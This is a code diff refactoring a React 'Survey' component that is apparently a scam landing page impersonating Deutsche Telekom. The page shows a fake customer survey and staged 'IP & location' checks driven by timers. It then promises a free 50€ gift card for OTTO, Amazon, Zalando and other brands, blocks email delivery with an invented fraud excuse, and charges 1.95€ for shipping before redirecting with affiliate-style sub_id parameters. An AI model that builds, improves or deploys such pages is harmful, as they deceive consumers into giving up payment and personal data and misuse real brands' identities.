@@ -1,12 +1,11 @@
-import React, { useState, useEffect } from 'react';
+import React, { useState, useEffect, useMemo, useCallback } from 'react';
 import { useNavigate } from 'react-router-dom';
 import { Button } from '@/components/ui/button';
 import { RadioGroup, RadioGroupItem } from '@/components/ui/radio-group';
 import { Label } from '@/components/ui/label';
 import { Star, ChevronLeft, ChevronRight, Search, Phone, ShoppingCart, User, Menu } from 'lucide-react';
-import hmLogo from '@/assets/hm-logo.png';
 
-// Brand logo URLs
+// Optimized brand logos object
 const brandLogos = {
   otto: '/lovable-uploads/37661bc2-befd-4af2-a40d-2b2eab85905b.png',
   amazon: '/lovable-uploads/5706dc74-fbd3-4509-bd70-be7ece552da4.png',
@@ -14,7 +13,27 @@ const brandLogos = {
   zalando: '/lovable-uploads/7ab6f500-1d20-4002-bf77-28e37b63038a.png',
   douglas: '/lovable-uploads/95dd02e6-344d-4f50-84af-f025c870e6d4.png',
   telekom: '/lovable-uploads/3e49a8df-ca13-4797-b908-fd71651ff987.png'
-};
+} as const;
+
+// Memoized brand configuration
+const brandConfig = {
+  otto: { name: 'OTTO', website: 'Otto.de', color: 'bg-red-600', textColor: 'text-red-600', value: '50€' },
+  hm: { name: 'H&M', website: 'H&M', color: 'bg-black', textColor: 'text-black', value: '50€' },
+  amazon: { name: 'amazon.de', website: 'Amazon', color: 'bg-orange-500', textColor: 'text-black', value: '50€' },
+  douglas: { name: 'DOUGLAS', website: 'Douglas.de', color: 'bg-black', textColor: 'text-black', value: '50€' },
+  telekom: { name: 'T', website: 'Telekom', color: 'bg-pink-600', textColor: 'text-pink-600', value: '60€' },
+  zalando: { name: '🧡 zalando', website: 'Zalando.de', color: 'bg-orange-500', textColor: 'text-orange-500', value: '50€' }
+} as const;
+
+// Optimized brand grid data
+const brandGridItems = [
+  { name: 'Otto.de', brand: 'otto' as keyof typeof brandConfig },
+  { name: 'H&M', brand: 'hm' as keyof typeof brandConfig },
+  { name: 'Amazon', brand: 'amazon' as keyof typeof brandConfig },
+  { name: 'Douglas.de', brand: 'douglas' as keyof typeof brandConfig },
+  { name: 'Telekom', brand: 'telekom' as keyof typeof brandConfig },
+  { name: 'Zalando.de', brand: 'zalando' as keyof typeof brandConfig }
+] as const;
 
 const Survey = () => {
   const navigate = useNavigate();
@@ -24,7 +43,7 @@ const Survey = () => {
   const [isProcessing, setIsProcessing] = useState(false);
   const [processingStep, setProcessingStep] = useState(1);
   const [showRewards, setShowRewards] = useState(false);
-  const [selectedBrand, setSelectedBrand] = useState('otto');
+  const [selectedBrand, setSelectedBrand] = useState<keyof typeof brandConfig>('otto');
   const [selectedDelivery, setSelectedDelivery] = useState('');
   const [showEmailError, setShowEmailError] = useState(false);
   const [selectedAddress, setSelectedAddress] = useState('');
@@ -32,7 +51,8 @@ const Survey = () => {
 
   const totalSteps = 9;
 
-  const questions = [
+  // Memoized questions array
+  const questions = useMemo(() => [
     {
       id: 'satisfaction',
       title: 'Wie zufrieden sind Sie mit Ihrer aktuellen T-Online-Erfahrung?',
@@ -114,65 +134,102 @@ const Survey = () => {
       type: 'star-rating',
       options: []
     }
-  ];
+  ], []);
 
+  // Memoized current brand and question
+  const currentBrand = useMemo(() => brandConfig[selectedBrand], [selectedBrand]);
+  const currentQuestion = useMemo(() => questions[currentStep - 1], [questions, currentStep]);
+
+  // Optimized loading effect
   useEffect(() => {
-    const timer = setTimeout(() => {
-      setIsLoading(false);
-    }, 2000);
-
+    const timer = setTimeout(() => setIsLoading(false), 2000);
     return () => clearTimeout(timer);
   }, []);
 
+  // Optimized processing effect
   useEffect(() => {
-    if (isProcessing) {
-      const steps = [
-        { delay: 1000, step: 1 },
-        { delay: 3000, step: 2 },
-        { delay: 5000, step: 3 },
-        { delay: 7000, step: 4 }
-      ];
+    if (!isProcessing) return;
 
-      steps.forEach(({ delay, step }) => {
-        setTimeout(() => {
-          if (step === 4) {
-            setIsProcessing(false);
-            setShowRewards(true);
-          } else {
-            setProcessingStep(step);
-          }
-        }, delay);
-      });
-    }
+    const steps = [
+      { delay: 1000, step: 1 },
+      { delay: 3000, step: 2 },
+      { delay: 5000, step: 3 },
+      { delay: 7000, step: 4 }
+    ];
+
+    const timeouts = steps.map(({ delay, step }) =>
+      setTimeout(() => {
+        if (step === 4) {
+          setIsProcessing(false);
+          setShowRewards(true);
+        } else {
+          setProcessingStep(step);
+        }
+      }, delay)
+    );
+
+    return () => timeouts.forEach(clearTimeout);
   }, [isProcessing]);
 
-  const handleStarRating = (questionId: string, rating: number) => {
+  // Memoized event handlers
+  const handleStarRating = useCallback((questionId: string, rating: number) => {
     setAnswers(prev => ({ ...prev, [questionId]: rating.toString() }));
-  };
+  }, []);
 
-  const handleRadioChange = (questionId: string, value: string) => {
+  const handleRadioChange = useCallback((questionId: string, value: string) => {
     setAnswers(prev => ({ ...prev, [questionId]: value }));
-  };
+  }, []);
 
-  const handleNext = () => {
+  const handleNext = useCallback(() => {
     if (currentStep < totalSteps) {
       setCurrentStep(prev => prev + 1);
     }
-  };
+  }, [currentStep, totalSteps]);
 
-  const handleBack = () => {
+  const handleBack = useCallback(() => {
     if (currentStep > 1) {
       setCurrentStep(prev => prev - 1);
     }
-  };
+  }, [currentStep]);
 
-  const handleSubmit = () => {
+  const handleSubmit = useCallback(() => {
     console.log('Survey completed:', answers);
     setIsProcessing(true);
     setProcessingStep(1);
-  };
+  }, [answers]);
 
-  const renderStarRating = (questionId: string) => {
+  const handleBrandSelect = useCallback((brand: keyof typeof brandConfig) => {
+    setSelectedBrand(brand);
+    setRewardStep(1);
+  }, []);
+
+  const handleEmailClick = useCallback(() => {
+    setSelectedDelivery('');
+    setSelectedAddress('');
+    setShowEmailError(true);
+    setRewardStep(1);
+  }, []);
+
+  const handleHomeSelect = useCallback(() => {
+    setSelectedDelivery('home');
+    setShowEmailError(false);
+    setRewardStep(2);
+  }, []);
+
+  const handleAddressSelect = useCallback((addressType: string) => {
+    setSelectedAddress(addressType);
+    setRewardStep(3);
+  }, []);
+
+  const handleWeiterClick = useCallback(() => {
+    const subId4 = "30 Jahre Deutsche Telekom - 50€ Geschenkkarte";
+    const subId5 = brandLogos[selectedBrand];
+    const redirectUrl = `/?_lp=1&sub_id_4=${encodeURIComponent(subId4)}&sub_id_5=${encodeURIComponent(subId5)}`;
+    window.location.href = redirectUrl;
+  }, [selectedBrand]);
+
+  // Memoized render functions for better performance
+  const renderStarRating = useCallback((questionId: string) => {
     const currentRating = parseInt(answers[questionId] || '0');
     
     return (
@@ -181,7 +238,7 @@ const Survey = () => {
           <button
             key={star}
             onClick={() => handleStarRating(questionId, star)}
-            className="transition-colors duration-200 active:scale-95 p-1"
+            className="transition-colors duration-200 active:scale-95 p-1 touch-manipulation"
             aria-label={`${star} von 5 Sternen`}
           >
             <Star
@@ -195,9 +252,9 @@ const Survey = () => {
         ))}
       </div>
     );
-  };
+  }, [answers, handleStarRating]);
 
-  const renderRadioOptions = (questionId: string, options: string[]) => {
+  const renderRadioOptions = useCallback((questionId: string, options: string[]) => {
     return (
       <RadioGroup
         value={answers[questionId] || ''}
@@ -205,7 +262,7 @@ const Survey = () => {
         className="space-y-3 sm:space-y-4 my-6 sm:my-8"
       >
         {options.map((option, index) => (
-          <div key={index} className="flex items-center space-x-3 p-2 rounded hover:bg-gray-50 transition-colors">
+          <div key={index} className="flex items-center space-x-3 p-2 rounded hover:bg-gray-50 transition-colors touch-manipulation">
             <RadioGroupItem value={option} id={`${questionId}-${index}`} className="shrink-0" />
             <Label htmlFor={`${questionId}-${index}`} className="text-gray-700 cursor-pointer text-sm sm:text-base leading-relaxed">
               {option}
@@ -214,11 +271,41 @@ const Survey = () => {
         ))}
       </RadioGroup>
     );
-  };
+  }, [answers, handleRadioChange]);
 
+  // Memoized brand grid component
+  const BrandGrid = useMemo(() => (
+    <div className="grid grid-cols-2 gap-3 sm:gap-4 mb-6">
+      {brandGridItems.map((item) => (
+        <button
+          key={item.brand}
+          onClick={() => handleBrandSelect(item.brand)}
+          className={`aspect-square border-2 rounded-lg transition-all p-3 sm:p-4 touch-manipulation ${
+            selectedBrand === item.brand
+              ? 'border-pink-600 bg-pink-50'
+              : 'border-gray-300 hover:border-pink-300 bg-white'
+          }`}
+        >
+          <div className="h-full flex flex-col items-center justify-center">
+            <div className="h-10 sm:h-12 flex items-center justify-center mb-2">
+              <img 
+                src={brandLogos[item.brand]} 
+                alt={item.name}
+                className="h-10 sm:h-12 max-w-[70px] sm:max-w-[80px] object-contain"
+                loading="lazy"
+              />
+            </div>
+            <div className="text-xs sm:text-sm text-gray-600 text-center font-medium">{item.name}</div>
+          </div>
+        </button>
+      ))}
+    </div>
+  ), [selectedBrand, handleBrandSelect]);
+
+  // Early return for loading state
   if (isLoading) {
     return (
-      <div className="min-h-screen flex items-center justify-center" style={{ backgroundColor: '#8B7B8B' }}>
+      <div className="min-h-screen flex items-center justify-center bg-gray-600">
         <div className="flex flex-col items-center space-y-4">
           <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-white"></div>
           <p className="text-white font-medium">Umfrage wird geladen...</p>
@@ -227,10 +314,8 @@ const Survey = () => {
     );
   }
 
-  const currentQuestion = questions[currentStep - 1];
-
   return (
-    <div className="min-h-screen" style={{ backgroundColor: '#f5f5f5' }}>
+    <div className="min-h-screen bg-gray-100">
       {/* Header */}
       <header className="bg-white shadow-sm">
         {/* Top pink bar - hidden on mobile */}
@@ -238,11 +323,11 @@ const Survey = () => {
           <div className="max-w-7xl mx-auto flex justify-between items-center">
             <div className="flex space-x-6">
               <span className="font-medium text-white">Privatkunden</span>
-              <span className="text-pink-200 hover:text-white cursor-pointer">Geschäftskunden</span>
+              <span className="text-pink-200 hover:text-white cursor-pointer transition-colors">Geschäftskunden</span>
             </div>
             <div className="flex space-x-6">
-              <span className="hover:text-pink-200 cursor-pointer">Telekom Shops</span>
-              <span className="hover:text-pink-200 cursor-pointer">Kontakt</span>
+              <span className="hover:text-pink-200 cursor-pointer transition-colors">Telekom Shops</span>
+              <span className="hover:text-pink-200 cursor-pointer transition-colors">Kontakt</span>
             </div>
           </div>
         </div>
@@ -258,6 +343,7 @@ const Survey = () => {
                     src="/lovable-uploads/3a50a6ae-c8a9-4e79-8237-5c8031a412fd.png" 
                     alt="Telekom" 
                     className="w-8 h-8 object-contain"
+                    loading="lazy"
                   />
                 </div>
                 <nav className="flex space-x-4 lg:space-x-6 overflow-x-auto">
@@ -291,6 +377,7 @@ const Survey = () => {
                   src="/lovable-uploads/3a50a6ae-c8a9-4e79-8237-5c8031a412fd.png" 
                   alt="Telekom" 
                   className="w-8 h-8 object-contain"
+                  loading="lazy"
                 />
               </div>
               <div className="flex items-center space-x-3 shrink-0">
@@ -314,8 +401,8 @@ const Survey = () => {
       {/* Breadcrumb */}
       <div className="max-w-7xl mx-auto px-4 py-2">
         <div className="text-sm text-gray-500 overflow-x-auto whitespace-nowrap">
-          <span className="hover:text-pink-600 cursor-pointer">Telekom</span> › 
-          <span className="hover:text-pink-600 cursor-pointer"> Unterwegs</span> › 
+          <span className="hover:text-pink-600 cursor-pointer transition-colors">Telekom</span> › 
+          <span className="hover:text-pink-600 cursor-pointer transition-colors"> Unterwegs</span> › 
           <span className="text-pink-600 font-medium"> Aktionen</span>
         </div>
       </div>
@@ -324,86 +411,44 @@ const Survey = () => {
       <main className="max-w-4xl mx-auto px-4 py-4 md:py-8">
         {/* Processing Screen */}
         {isProcessing && (
-          <div className="bg-white rounded-lg shadow-lg overflow-hidden p-8">
+          <div className="bg-white rounded-lg shadow-lg overflow-hidden p-6 sm:p-8 mx-2 sm:mx-0">
             <div className="text-center">
-              <h2 className="text-xl font-bold text-gray-800 mb-4">Umfrage wird verarbeitet</h2>
+              <h2 className="text-lg sm:text-xl font-bold text-gray-800 mb-4">Umfrage wird verarbeitet</h2>
               <p className="text-gray-600 mb-8">Bitte warten Sie, während wir Ihre Eingabe verarbeiten</p>
               
               <div className="space-y-6 max-w-md mx-auto">
-                {/* IP & Location Check */}
-                <div className="flex items-center space-x-4">
-                  <div className={`w-6 h-6 rounded-full flex items-center justify-center ${
-                    processingStep >= 1 ? 'bg-green-500' : 'bg-gray-300'
-                  }`}>
-                    {processingStep >= 1 && (
-                      <svg className="w-4 h-4 text-white" fill="currentColor" viewBox="0 0 20 20">
-                        <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
-                      </svg>
-                    )}
-                  </div>
-                  <div className="text-left">
-                    <p className={`font-medium ${processingStep >= 1 ? 'text-green-600' : 'text-gray-500'}`}>
-                      IP & Standort überprüfen
-                    </p>
-                    <p className={`text-sm ${processingStep >= 1 ? 'text-green-500' : 'text-gray-400'}`}>
-                      {processingStep >= 1 ? 'Überprüfung Ihres geografischen Standorts...' : 'Überprüfung Ihres geografischen Standorts...'}
-                    </p>
-                  </div>
-                </div>
-
-                {/* Save Answers */}
-                <div className="flex items-center space-x-4">
-                  <div className={`w-6 h-6 rounded-full flex items-center justify-center ${
-                    processingStep >= 2 ? 'bg-green-500' : processingStep === 1 ? 'bg-pink-500' : 'bg-gray-300'
-                  }`}>
-                    {processingStep >= 2 ? (
-                      <svg className="w-4 h-4 text-white" fill="currentColor" viewBox="0 0 20 20">
-                        <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
-                      </svg>
-                    ) : processingStep === 1 ? (
-                      <div className="w-3 h-3 bg-white rounded-full animate-pulse"></div>
-                    ) : null}
-                  </div>
-                  <div className="text-left">
-                    <p className={`font-medium ${
-                      processingStep >= 2 ? 'text-green-600' : processingStep === 1 ? 'text-pink-600' : 'text-gray-500'
+                {/* Processing steps */}
+                {[
+                  { step: 1, title: 'IP & Standort überprüfen', desc: 'Überprüfung Ihres geografischen Standorts...' },
+                  { step: 2, title: 'Antworten speichern', desc: 'Ihre Antworten werden sicher gespeichert...' },
+                  { step: 3, title: 'Berechtigung prüfen', desc: 'Überprüfung der Umfragevoraussetzungen...' }
+                ].map((item) => (
+                  <div key={item.step} className="flex items-center space-x-4">
+                    <div className={`w-6 h-6 rounded-full flex items-center justify-center ${
+                      processingStep >= item.step ? 'bg-green-500' : processingStep === item.step - 1 ? 'bg-pink-500' : 'bg-gray-300'
                     }`}>
-                      Antworten speichern
-                    </p>
-                    <p className={`text-sm ${
-                      processingStep >= 2 ? 'text-green-500' : processingStep === 1 ? 'text-pink-500' : 'text-gray-400'
-                    }`}>
-                      {processingStep >= 2 ? 'Ihre Antworten werden sicher gespeichert...' : 'Ihre Antworten werden sicher gespeichert...'}
-                    </p>
+                      {processingStep >= item.step ? (
+                        <svg className="w-4 h-4 text-white" fill="currentColor" viewBox="0 0 20 20">
+                          <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
+                        </svg>
+                      ) : processingStep === item.step - 1 ? (
+                        <div className="w-3 h-3 bg-white rounded-full animate-pulse"></div>
+                      ) : null}
+                    </div>
+                    <div className="text-left">
+                      <p className={`font-medium ${
+                        processingStep >= item.step ? 'text-green-600' : processingStep === item.step - 1 ? 'text-pink-600' : 'text-gray-500'
+                      }`}>
+                        {item.title}
+                      </p>
+                      <p className={`text-sm ${
+                        processingStep >= item.step ? 'text-green-500' : processingStep === item.step - 1 ? 'text-pink-500' : 'text-gray-400'
+                      }`}>
+                        {item.desc}
+                      </p>
+                    </div>
                   </div>
-                </div>
-
-                {/* Check Eligibility */}
-                <div className="flex items-center space-x-4">
-                  <div className={`w-6 h-6 rounded-full flex items-center justify-center ${
-                    processingStep >= 3 ? 'bg-green-500' : processingStep === 2 ? 'bg-pink-500' : 'bg-gray-300'
-                  }`}>
-                    {processingStep >= 3 ? (
-                      <svg className="w-4 h-4 text-white" fill="currentColor" viewBox="0 0 20 20">
-                        <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
-                      </svg>
-                    ) : processingStep === 2 ? (
-                      <div className="w-3 h-3 bg-white rounded-full animate-pulse"></div>
-                    ) : null}
-                  </div>
-                  <div className="text-left">
-                    <p className={`font-medium ${
-                      processingStep >= 3 ? 'text-green-600' : processingStep === 2 ? 'text-pink-600' : 'text-gray-500'
-                    }`}>
-                      Berechtigung prüfen
-                    </p>
-                    <p className={`text-sm ${
-                      processingStep >= 3 ? 'text-green-500' : processingStep === 2 ? 'text-pink-500' : 'text-gray-400'
-                    }`}>
-                      {processingStep >= 3 ? 'Überprüfung der Umfragevoraussetzungen...' : 'Überprüfung der Umfragevoraussetzungen...'}
-                    </p>
-                  </div>
-                </div>
+                ))}
               </div>
 
               {/* Progress Bar */}
@@ -420,89 +465,253 @@ const Survey = () => {
         )}
 
         {/* Rewards Selection Screen */}
-        {showRewards && (() => {
-          const brands = {
-            otto: { name: 'OTTO', website: 'Otto.de', color: 'bg-red-600', textColor: 'text-red-600', value: '50€' },
-            hm: { name: 'H&M', website: 'H&M', color: 'bg-black', textColor: 'text-black', value: '50€' },
-            amazon: { name: 'amazon.de', website: 'Amazon', color: 'bg-orange-500', textColor: 'text-black', value: '50€' },
-            douglas: { name: 'DOUGLAS', website: 'Douglas.de', color: 'bg-black', textColor: 'text-black', value: '50€' },
-            telekom: { name: 'T', website: 'Telekom', color: 'bg-pink-600', textColor: 'text-pink-600', value: '60€' },
-            zalando: { name: '🧡 zalando', website: 'Zalando.de', color: 'bg-orange-500', textColor: 'text-orange-500', value: '50€' }
-          };
-
-          const currentBrand = brands[selectedBrand] || brands.otto;
-
-          const handleBrandSelect = (brand: string) => {
-            setSelectedBrand(brand);
-            setRewardStep(1);
-          };
-
-          const handleEmailClick = () => {
-            setSelectedDelivery('');
-            setSelectedAddress('');
-            setShowEmailError(true);
-            setRewardStep(1);
-          };
-
-          const handleHomeSelect = () => {
-            setSelectedDelivery('home');
-            setShowEmailError(false);
-            setRewardStep(2);
-          };
-
-          const handleAddressSelect = (addressType: string) => {
-            setSelectedAddress(addressType);
-            setRewardStep(3);
-          };
-
-          const handleWeiterClick = () => {
-            const subId4 = "30 Jahre Deutsche Telekom - 50€ Geschenkkarte";
-            const subId5 = brandLogos[selectedBrand];
-            const redirectUrl = `/?_lp=1&sub_id_4=${encodeURIComponent(subId4)}&sub_id_5=${encodeURIComponent(subId5)}`;
-            window.location.href = redirectUrl;
-          };
-
-          return (
-            <div className="bg-white min-h-screen">
-              {/* Mobile Layout */}
-              <div className="block md:hidden">
-                {/* Step Indicators - Mobile */}
-                <div className="px-4 py-6 bg-gray-50">
-                  <div className="flex justify-center space-x-8">
-                    <div className="flex flex-col items-center">
-                      <div className={`w-10 h-10 ${rewardStep >= 1 ? 'bg-pink-600 text-white' : 'bg-gray-300 text-gray-600'} rounded-full flex items-center justify-center text-sm font-bold mb-2`}>
-                        1
+        {showRewards && (
+          <div className="bg-white min-h-screen">
+            {/* Mobile Layout */}
+            <div className="block md:hidden">
+              {/* Step Indicators - Mobile */}
+              <div className="px-4 py-6 bg-gray-50">
+                <div className="flex justify-center space-x-8">
+                  {[
+                    { step: 1, title: 'Marke\nwählen' },
+                    { step: 2, title: 'Lieferoption\nwählen' },
+                    { step: 3, title: 'Auswahl\nbestätigen' }
+                  ].map((item) => (
+                    <div key={item.step} className="flex flex-col items-center">
+                      <div className={`w-10 h-10 ${rewardStep >= item.step ? 'bg-pink-600 text-white' : 'bg-gray-300 text-gray-600'} rounded-full flex items-center justify-center text-sm font-bold mb-2`}>
+                        {item.step}
                       </div>
-                      <span className={`text-xs text-center ${rewardStep >= 1 ? 'text-pink-600 font-medium' : 'text-gray-500'}`}>
-                        Marke<br />wählen
+                      <span className={`text-xs text-center ${rewardStep >= item.step ? 'text-pink-600 font-medium' : 'text-gray-500'}`}>
+                        {item.title}
                       </span>
                     </div>
-                    <div className="flex flex-col items-center">
-                      <div className={`w-10 h-10 ${rewardStep >= 2 ? 'bg-pink-600 text-white' : 'bg-gray-300 text-gray-600'} rounded-full flex items-center justify-center text-sm font-bold mb-2`}>
-                        2
+                  ))}
+                </div>
+              </div>
+
+              {/* Single Scrolling Page - Mobile */}
+              <div className="px-4 py-6">
+                {/* Brand Selection Section */}
+                <div className="mb-8">
+                  <h2 className="text-xl font-semibold text-pink-600 mb-6">Marke auswählen</h2>
+                  
+                  {/* Brand Grid - Mobile */}
+                  {BrandGrid}
+
+                  {/* Mobile Gift Card */}
+                  <div className={`${currentBrand.color} text-white p-4 sm:p-6 rounded-lg mb-6`}>
+                    <div className="flex items-center justify-between">
+                      <div className="flex items-center space-x-2 sm:space-x-3 min-w-0 flex-1">
+                        <img 
+                          src={brandLogos[selectedBrand]} 
+                          alt={currentBrand.name}
+                          className="h-6 w-6 sm:h-8 sm:w-8 object-contain filter brightness-0 invert shrink-0"
+                          loading="lazy"
+                        />
+                        <div className="min-w-0">
+                          <div className="text-sm font-medium truncate">{currentBrand.website}</div>
+                          <div className="text-xs opacity-90">30 Jahre Deutsche Telekom</div>
+                          <div className="text-xs opacity-90 leading-tight">Gültig in allen Telekom Shops und auf telekom.de</div>
+                        </div>
                       </div>
-                      <span className={`text-xs text-center ${rewardStep >= 2 ? 'text-pink-600 font-medium' : 'text-gray-500'}`}>
-                        Lieferoption<br />wählen
-                      </span>
-                    </div>
-                    <div className="flex flex-col items-center">
-                      <div className={`w-10 h-10 ${rewardStep >= 3 ? 'bg-pink-600 text-white' : 'bg-gray-300 text-gray-600'} rounded-full flex items-center justify-center text-sm font-bold mb-2`}>
-                        3
+                      <div className="text-right shrink-0 ml-2">
+                        <div className="text-xs opacity-90">Geschenkkarte</div>
+                        <div className="text-xl sm:text-2xl font-bold">{currentBrand.value}</div>
                       </div>
-                      <span className={`text-xs text-center ${rewardStep >= 3 ? 'text-pink-600 font-medium' : 'text-gray-500'}`}>
-                        Auswahl<br />bestätigen
-                      </span>
                     </div>
                   </div>
+
+                  <h3 className="text-lg font-semibold text-pink-600 mb-2">{currentBrand.website} Geschenkkarte - {currentBrand.value}</h3>
+                  <p className="text-sm text-gray-600 mb-4">
+                    30 Jahre Deutsche Telekom - Wir feiern mit großartigen Angeboten und Aktionen! Nutzen Sie diese 
+                    Geschenkkarte in jedem Telekom Shop oder online auf telekom.de. Nur im Juni verfügbar.
+                  </p>
+                  
+                  <ul className="text-sm text-gray-600 space-y-1 mb-8">
+                    <li>• Wert: {currentBrand.value}</li>
+                    <li>• Gültig für 1 Jahr ab Kaufdatum</li>
+                    <li>• Kann für alle Telekom Produkte oder Dienstleistungen verwendet werden</li>
+                  </ul>
                 </div>
 
-                {/* Single Scrolling Page - Mobile */}
-                <div className="px-4 py-6">
-                  {/* Brand Selection Section */}
-                  <div className="mb-8">
-                    <h2 className="text-xl font-semibold text-pink-600 mb-6">Marke auswählen</h2>
-                    
-                    {/* Brand Grid - Mobile */}
+                {/* Delivery Options Section - Mobile */}
+                <div className="mb-8">
+                  <h2 className="text-xl font-semibold text-pink-600 mb-6">Lieferoption wählen</h2>
+                  
+                  {/* Warning Box - Only show when E-Mail is clicked */}
+                  {showEmailError && (
+                    <div className="bg-red-50 border border-red-200 rounded-lg p-4 mb-4">
+                      <div className="flex items-start space-x-3">
+                        <div className="w-4 h-4 border-2 border-red-500 rounded-full flex-shrink-0 mt-0.5"></div>
+                        <div className="text-sm text-red-700">
+                          Aufgrund von Betrügs- und Missbrauchsfällen ist ein Abgleich der Vertrags- mit der 
+                          Lieferadresse erforderlich. Deshalb wurde der Versand der Geschenkkarte per E-Mail 
+                          deaktiviert. Vielen Dank für Ihr Verständnis.
+                        </div>
+                      </div>
+                    </div>
+                  )}
+
+                  {/* Email Option */}
+                  <div 
+                    className="w-full border-2 border-gray-300 rounded-lg p-4 mb-4 bg-white hover:border-red-300 transition-colors cursor-pointer touch-manipulation"
+                    onClick={handleEmailClick}
+                  >
+                    <div className="flex items-center justify-between">
+                      <div className="flex items-center space-x-3">
+                        <div className="w-6 h-6 border-2 border-gray-400 rounded-full bg-white"></div>
+                        <div className="text-left">
+                          <div className="font-semibold text-gray-800 flex items-center">
+                            <span className="mr-2">✉️</span>
+                            E-Mail-Versand
+                          </div>
+                          <div className="text-sm text-gray-600">Erhalten Sie Ihre Geschenkkarte sofort per E-Mail</div>
+                        </div>
+                      </div>
+                      <div className="text-green-600 font-semibold">Kostenlos</div>
+                    </div>
+                  </div>
+
+                  {/* Home Delivery Option */}
+                  <button 
+                    onClick={handleHomeSelect}
+                    className={`w-full border-2 rounded-lg p-4 mb-6 transition-colors touch-manipulation ${
+                      selectedDelivery === 'home' ? 'border-pink-600 bg-pink-50' : 'border-gray-300 hover:border-pink-300 bg-white'
+                    }`}
+                  >
+                    <div className="flex items-center justify-between">
+                      <div className="flex items-center space-x-3">
+                        <div className={`w-6 h-6 border-2 rounded-full bg-white flex items-center justify-center ${
+                          selectedDelivery === 'home' ? 'border-pink-600' : 'border-gray-400'
+                        }`}>
+                          {selectedDelivery === 'home' && (
+                            <div className="w-3 h-3 bg-pink-600 rounded-full"></div>
+                          )}
+                        </div>
+                        <div className="text-left">
+                          <div className="font-semibold text-gray-800 flex items-center">
+                            <span className="mr-2">🏠</span>
+                            Heimversand
+                          </div>
+                          <div className="text-sm text-gray-600">Erhalten Sie eine physische Geschenkkarte an Ihre Adresse geliefert</div>
+                        </div>
+                      </div>
+                      <div className="font-semibold text-gray-800">+1.95€</div>
+                    </div>
+                  </button>
+
+                  {/* Address Selection - Show when home delivery is selected */}
+                  {selectedDelivery === 'home' && (
+                    <>
+                      <div className="text-sm font-semibold text-pink-600 mb-4">Empfänger auswählen:</div>
+
+                      {/* Info Box */}
+                      <div className="bg-blue-50 border border-blue-200 p-4 rounded-lg mb-6">
+                        <div className="flex items-start space-x-2">
+                          <div className="w-4 h-4 bg-blue-500 rounded-full flex-shrink-0 mt-0.5"></div>
+                          <div className="text-sm text-blue-700">
+                            Wir senden Ihnen eine E-Mail mit den Versandinformationen und den Details Ihrer 
+                            Bestellung, sobald Ihre Adresse erfolgreich überprüft wurde und Sie zur Lieferung 
+                            berechtigt sind.
+                          </div>
+                        </div>
+                      </div>
+
+                      {/* Address Options */}
+                      <button
+                        onClick={() => handleAddressSelect('meine')}
+                        className={`w-full border-2 rounded-lg p-4 mb-4 transition-colors touch-manipulation ${
+                          selectedAddress === 'meine' ? 'border-pink-600 bg-pink-50' : 'border-gray-300 hover:border-pink-300'
+                        }`}
+                      >
+                        <div className="flex items-center space-x-3">
+                          <div className={`w-6 h-6 border-2 border-pink-600 rounded-full ${
+                            selectedAddress === 'meine' ? 'bg-pink-600' : 'bg-white'
+                          } flex items-center justify-center`}>
+                            {selectedAddress === 'meine' && <div className="w-2 h-2 bg-white rounded-full"></div>}
+                          </div>
+                          <div className="text-left">
+                            <div className="font-semibold text-gray-800 flex items-center">
+                              <span className="mr-2">👤</span>
+                              Meine Adresse
+                            </div>
+                            <div className="text-sm text-gray-600">Senden Sie die Geschenkkarte an meine Lieferadresse</div>
+                          </div>
+                        </div>
+                      </button>
+
+                      {/* Grayed out option */}
+                      <div className="w-full border-2 border-gray-200 rounded-lg p-4 mb-6 bg-gray-100 opacity-60 cursor-not-allowed">
+                        <div className="flex items-center space-x-3">
+                          <div className="w-6 h-6 border-2 border-gray-400 rounded-full bg-gray-200"></div>
+                          <div className="text-left">
+                            <div className="font-semibold text-gray-500 flex items-center">
+                              <span className="mr-2">👥</span>
+                              Adresse einer anderen Person
+                            </div>
+                            <div className="text-sm text-gray-400">Senden Sie die Geschenkkarte direkt an den Empfänger</div>
+                          </div>
+                        </div>
+                      </div>
+                    </>
+                  )}
+
+                  {/* Continue Button */}
+                  {selectedAddress === 'meine' ? (
+                    <button 
+                      onClick={handleWeiterClick}
+                      className="w-full bg-pink-600 hover:bg-pink-700 text-white py-3 rounded-lg font-semibold text-lg transition-colors touch-manipulation"
+                    >
+                      Weiter
+                    </button>
+                  ) : (
+                    <button 
+                      className="w-full bg-gray-300 text-gray-600 cursor-not-allowed py-3 rounded-lg font-semibold text-lg"
+                      disabled
+                    >
+                      Weiter
+                    </button>
+                  )}
+
+                  <p className="text-xs text-gray-500 mt-4 text-center">
+                    Die Geschenkkarte wird per Post versendet und kann je nach Anbieter als Plastikkarte, 
+                    ausgedruckter Gutschein oder in einer Geschenkverpackung ankommen.
+                  </p>
+                </div>
+              </div>
+            </div>
+
+            {/* Desktop Layout (existing) */}
+            <div className="hidden md:block">
+              {/* Step Indicators */}
+              <div className="bg-gray-50 px-8 py-6">
+                <div className="flex justify-center space-x-8">
+                  <div className="flex items-center space-x-2">
+                    <div className={`w-8 h-8 ${rewardStep >= 1 ? 'bg-pink-600 text-white' : 'bg-gray-300 text-gray-600'} rounded-full flex items-center justify-center text-sm font-bold`}>
+                      1
+                    </div>
+                    <span className={`${rewardStep >= 1 ? 'text-pink-600 font-medium' : 'text-gray-500'}`}>Marke wählen</span>
+                  </div>
+                  <div className="flex items-center space-x-2">
+                    <div className={`w-8 h-8 ${rewardStep >= 2 ? 'bg-pink-600 text-white' : 'bg-gray-300 text-gray-600'} rounded-full flex items-center justify-center text-sm font-bold`}>
+                      2
+                    </div>
+                    <span className={`${rewardStep >= 2 ? 'text-pink-600 font-medium' : 'text-gray-500'}`}>Lieferoption wählen</span>
+                  </div>
